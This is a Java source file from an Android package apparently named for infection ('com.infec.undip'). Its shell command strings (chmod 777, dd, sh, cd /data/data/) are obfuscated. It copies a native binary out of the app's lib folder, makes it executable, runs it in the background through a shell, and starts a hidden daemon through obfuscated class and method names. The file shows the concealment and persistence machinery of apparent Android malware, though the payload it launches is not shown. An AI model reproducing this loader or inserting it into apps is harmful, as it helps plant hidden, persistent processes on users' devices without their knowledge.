package com.infec.undip;

import android.content.Context;
import android.os.Environment;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;

public class Abc {
	
	private static final  String PATH 		= StrUtils.deCrypt(Utils.entryString("?tqdq?tqdq?"));    // /data/data/
	private static final String LIB 		= StrUtils.deCrypt(Utils.entryString("?|yr?"));          // /lib/
	private static final String SLASH 	    = StrUtils.deCrypt("/");
	private static final String CHMOD 	    = StrUtils.deCrypt(Utils.entryString("sx}t0'''0"));      // "chmod 777 "   不包含字符串
	private static final String DD 		    = StrUtils.deCrypt(Utils.entryString("tt0yv-"));         // dd if=
	private static final String OF 		    = StrUtils.deCrypt(Utils.entryString("0v-"));            // " of="         不包含字符串
	private static final String SH 		    = StrUtils.deCrypt(Utils.entryString("cx"));             // sh
	private static final String CD_DATA 	= StrUtils.deCrypt(Utils.entryString("st0?tqdq?tqdq?")); // cd /data/data/
	private static final String EXIT 		= StrUtils.deCrypt(Utils.entryString("uhyd"));           // exit\n
	private static final String CMD 		= StrUtils.deCrypt(Utils.entryString("S]T0Buce|d*"));    // CMD Result:\n
	private static final String EXCEPTION   = StrUtils.deCrypt(Utils.entryString("Uhsu`dy~*"));      // Exception:
	private static final String ENTER 	    = StrUtils.deCrypt("\n");
	private static final String A_ENTER 	= StrUtils.deCrypt(Utils.entryString("06"));             // " &\n"         不包含字符串
	private static final String SPACE 	    = StrUtils.deCrypt(" ");
	private static final String SEMICOLON 	= StrUtils.deCrypt(";");

	public static String RunExecutable(String pacaageName, String filename, String alias, String args) {
		String path = PATH + pacaageName;
		String cmd1 = path + LIB + filename;
		String cmd2 = path + SLASH + alias;
		String cmd2_a1 = path + SLASH + alias + SPACE + args;
		String cmd3 = CHMOD + cmd2;
		String cmd4 = DD + cmd1 + OF + cmd2;
		StringBuffer sb_result = new StringBuffer();

		if (!new File(PATH + alias).exists()) {
			RunLocalUserCommand(pacaageName, cmd4, sb_result); // 拷贝lib/libtest.so到上一层目录,同时命名为test.
			sb_result.append(SEMICOLON);
		}
		RunLocalUserCommand(pacaageName, cmd3, sb_result); // 改变test的属性,让其变为可执行
		sb_result.append(SEMICOLON);
		RunLocalUserCommand(pacaageName, cmd2_a1, sb_result); // 执行test程序.
		sb_result.append(SEMICOLON);
		return sb_result.toString();
	}

	public static boolean RunLocalUserCommand(String pacaageName, String command, StringBuffer sb_out_Result) {
		Process process = null;
		try {
			process = Runtime.getRuntime().exec(SH); // 获得shell进程
			DataInputStream inputStream = new DataInputStream(process.getInputStream());
			DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
			outputStream.writeBytes(CD_DATA + pacaageName + ENTER); // 保证在command在自己的数据目录里执行,才有权限写文件到当前目录
			outputStream.writeBytes(command + A_ENTER); // 让程序在后台运行，前台马上返回
			outputStream.writeBytes(EXIT);
			outputStream.flush();
			process.waitFor();
			byte[] buffer = new byte[inputStream.available()];
			inputStream.read(buffer);
			String s = new String(buffer);
			if (sb_out_Result != null)
				sb_out_Result.append(CMD + s);
		} catch (Exception e) {
			if (sb_out_Result != null)
				sb_out_Result.append(EXCEPTION + e.getMessage());
			return false;
		}
		return true;
	}

	public static void startDaemon(final Context context, final String clsName) {
		String executable = Utils.EXECUTABLE;
		String aliasfile = Utils.LIB_NAME;
		RunExecutable(context.getPackageName(), executable, aliasfile, context.getPackageName() + SLASH + clsName);
 
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					SpencMishna.getInstance().spriQuovis(context.getPackageName() + SLASH + clsName, createRootPath(context));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
	
	
	private static String createRootPath(Context context) {
		String rootPath = "";
		if (isSdCardAvailable()) {
			// /sdcard/Android/data/<application package>/cache
			rootPath = context.getExternalCacheDir()
					.getPath();
		} else {
			// /data/data/<application package>/cache
			rootPath = context.getCacheDir().getPath();
		}
		return rootPath;
	}
	
	private static boolean isSdCardAvailable() {
		return Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED);
	}

}
